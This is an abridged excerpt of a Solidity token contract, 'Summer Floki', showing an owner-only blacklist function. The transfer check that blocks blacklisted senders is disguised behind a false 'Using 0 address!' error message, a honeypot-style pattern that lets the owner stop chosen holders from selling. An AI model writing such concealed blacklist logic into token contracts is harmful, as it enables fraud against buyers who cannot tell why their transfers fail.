...
contract SummerFloki  is Context, IERC20 { 
    ...
    string private constant _name = "Summer Floki";
    ...
    uint256 public _maxTransactionAmount = _tTotal; 
    ...
    function blackListAddress(address _address, bool _value) public onlyOwner {
        _blackListAddr[_address] = _value;
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair)
            require(amount <= _maxTransactionAmount, "Over transaction limit.");

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero."); 
        require(!_blackListAddr[from], "ERR: Using 0 address!");
